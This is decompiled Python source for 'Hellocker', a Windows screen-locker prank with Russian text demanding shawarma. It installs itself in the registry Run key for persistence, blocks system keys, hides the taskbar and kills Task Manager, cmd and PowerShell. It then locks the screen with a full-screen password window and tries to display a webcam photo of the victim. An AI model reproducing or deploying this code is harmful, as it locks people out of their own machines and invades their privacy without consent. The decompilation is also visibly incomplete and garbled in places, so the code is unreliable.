# Version : Python 3.10

import os
import sys
import ctypes
import keyboard
import psutil
import winreg
import cv2
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QLabel, QPushButton, QLineEdit
from PyQt5.QtCore import Qt, QThread
from PyQt5.QtGui import QPixmap, QImage

password = '111'
lock_text = 'Ну все, попался, жмот! У меня есть твоя фотка. Пароль после шавухи ток будет)'
count = 3
file_path = os.getcwd() + '\\' + os.path.basename(sys.argv[0])
photo_path = 'webcam_photo.jpg'


def startup(file_path):
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, 'Hellocker', 0, winreg.REG_SZ, file_path)
    winreg.CloseKey(key)


def disable_physical_keyboard():
    keyboard.block_key('windows')
    keyboard.block_key('alt')
    keyboard.block_key('tab')
    keyboard.block_key('ctrl')
    keyboard.block_key('esc')
    keyboard.block_key('f4')


def hide_taskbar():
    hwnd = ctypes.windll.user32.FindWindowW('Shell_TrayWnd', None)
    ctypes.windll.user32.ShowWindow(hwnd, 0)


def kill_unwanted_apps():
    unwanted_apps = [
        'taskmgr.exe',
        'cmd.exe',
        'powershell.exe']
    for proc in psutil.process_iter([
        'pid',
        'name']):
        if proc.info['name'] in unwanted_apps:
            proc.kill()


def capture_webcam_photo():
    pass


# WARNING: Decompyle incomplete


def run_main_script():
    disable_physical_keyboard()
    hide_taskbar()
    kill_unwanted_apps()
    capture_webcam_photo()


def block_alt_tab():
    keyboard.block_key('alt')
    keyboard.block_key('tab')


class WorkerThread(QThread):

    def run(self):
        run_main_script()


class WelcomeWindow(QWidget):

    def __init__(self=None):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('Question')
        self.setFixedSize(400, 200)
        self.setStyleSheet('background-color: white; font-size: 18px;')
        layout = QVBoxLayout()
        label = QLabel('Купишь мне шаурму?')
        label.setAlignment(Qt.AlignCenter)
        layout.addWidget(label)
        yes_button = QPushButton('Да')
        yes_button.setStyleSheet('background-color: green; color: white; font-size: 16px;')
        yes_button.clicked.connect(self.close_program)
        layout.addWidget(yes_button)
        no_button = QPushButton('Нет')
        no_button.setStyleSheet('background-color: red; color: white; font-size: 16px;')
        no_button.clicked.connect(self.start_password_check)
        layout.addWidget(no_button)
        self.setLayout(layout)

    def close_program(self):
        self.show_message('Правильный ответ', 'Ладно, правильный ответ :)', False, **('is_warning',))
        sys.exit()

    def start_password_check(self):
        self.close()
        self.start_blocking_script()

    def start_blocking_script(self):
        self.wind = QWidget()
        self.wind.setWindowTitle('Password Entry')
        self.wind.setStyleSheet('background-color: black; font-size: 75px; color: red;')
        self.wind.setGeometry(0, 0, 1920, 1080)
        self.wind.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        layout = QVBoxLayout()
        lock_label = QLabel(lock_text, self.wind)
        lock_label.setStyleSheet('color: red; font-size: 30px;')
        lock_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(lock_label)
        pixmap = capture_webcam_photo()
        if pixmap:
            photo_label = QLabel(self.wind)
            photo_label.setPixmap(pixmap.scaled(800, 600, Qt.KeepAspectRatio))
            layout.addWidget(photo_label)
        self.enter_pass = QLineEdit(self.wind)
        self.enter_pass.setEchoMode(QLineEdit.Password)
        self.enter_pass.setStyleSheet('background-color: black; color: red; font-size: 35px;')
        layout.addWidget(self.enter_pass)
        button = QPushButton('Unlock', self.wind)
        button.setStyleSheet('background-color: red; color: white; font-size: 16px;')
        None((lambda: self.check_password(self.enter_pass)))
        layout.addWidget(button)
        self.wind.setLayout(layout)
        self.wind.show()
        block_alt_tab()
        self.worker = WorkerThread()
        self.worker.start()

    def show_message(self, title, message, is_warning=(True,)):
        print(f'''Showing message: {title} - {message}''')
        msg = QWidget()
        msg.setWindowTitle(title)
        msg.setStyleSheet('background-color: black; color: red; font-size: 35px;')
        msg.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        layout = QVBoxLayout()
        label = QLabel(message, msg)
        label.setAlignment(Qt.AlignCenter)
        layout.addWidget(label)
        button = QPushButton('OK', msg)
        button.setStyleSheet('background-color: red; color: white; font-size: 16px;')
        button.clicked.connect(msg.close)
        layout.addWidget(button)
        msg.setLayout(layout)
        msg.show()

    def check_password(self, enter_pass):
        pass

    # WARNING: Decompyle incomplete

    __classcell__ = None


app = QApplication(sys.argv)
welcome = WelcomeWindow()
welcome.show()
app.exec_()